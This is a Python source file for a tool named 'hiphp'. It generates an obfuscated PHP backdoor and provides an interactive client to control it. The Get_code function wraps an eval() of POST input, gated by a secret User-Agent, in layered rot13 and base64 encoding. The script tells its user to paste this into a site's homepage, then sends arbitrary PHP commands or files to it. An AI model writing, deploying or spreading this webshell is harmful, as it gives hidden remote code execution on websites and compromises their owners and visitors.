#!/usr/bin/env python
# coding:utf-8
# code by : Yasser BDJ
# email : by.root96@gmail.com 
#s
import requests
from ashar import ashar
import string

#start hiphp class:
class hiphp:
    def __init__(mysillyobject,key,url):
        mysillyobject.key=ashar(key,key).encode()
        mysillyobject.url=url

    #run:
    def run(abc):
        headers={'User-Agent':abc.key}
        response=requests.post(abc.url,headers=headers)
        if response.status_code==200:
            if response.text[0:7]=="#python":
                hiphp.input_command(abc.url,headers)
            else:
                print("The function reading code was not recognized.\nPlease copy and paste the following code at the top of the homepage or in another php file, taking into account the path you will enter in the original function.\n")
                print(hiphp.Get_code(abc.key))
        else:
            print("We were unable to recognize the hiphp identifier.")
    #post:
    def post(url,headers,command):
        ploads={'command':command}#open('php.php').read()
        response=requests.post(url,headers=headers,data=ploads)
        return response
        
    #check_errors:
    def check_errors(response):
        if response[7:13]!="<br />":
            print(response[7:])
        else:
            print('ERROR in command line.')
    
    #help:    
    def help():
        print("  -h             | help              -> Help list.")
        print("  -e             | exit              -> Exit.")
        print("  -c <PASSWORD>  | create <PASSWORD> -> Create new code")
        print("  -f <FILE_PATH> | file <FILE_PATH>  -> Executing php file in the terminal.")
        print("  <PHP_COMMAND>                      -> Executing php commands in the terminal")
    
    #input_command:
    def input_command(url,headers):
        c=input('hiphp>>>')
        if c:
            if c[0:2]=='-c' or c[0:6]=='create':
                print(hiphp.Get_code(ashar(c[3:],c[3:]).encode()))
            elif c[0:2]=='-f' or c[0:4]=='file':
                open_file=open(c[3:]).read()
                if open_file[0:5]=="<?php":
                    open_file=open_file[6:]
                if open_file[len(open_file)-2:len(open_file)]=="?>":
                    open_file=open_file[:len(open_file)-2]
                response=hiphp.post(url,headers,open_file)
                hiphp.check_errors(response.text)
            elif c[0:2]=='-h' or c[0:4]=='help':
                hiphp.help()
            elif c[0:2]=='-e' or c[0:4]=='exit':
                exit()
            else:
                response=hiphp.post(url,headers,c)
                hiphp.check_errors(response.text)
        else:
	        print('Command not found!')
        hiphp.input_command(url,headers)

    #torot13:
    def rot13(text):
        rot13=str.maketrans("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz","NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
        return str.translate(text,rot13)
        
    #Get_code:
    def Get_code(key):
        login_key=ashar(key,key).encode()
        code="if($_SERVER['HTTP_USER_AGENT']=='"+key+"'){echo'#python';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
        code=hiphp.rot13(code)
        code=ashar.tob64(code)
        code=hiphp.rot13(code)
        code=ashar.tob64(code)
        code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode('{code}')))));"
        return "/*php code start*/\n"+code+"\n/*php code end*/"
#e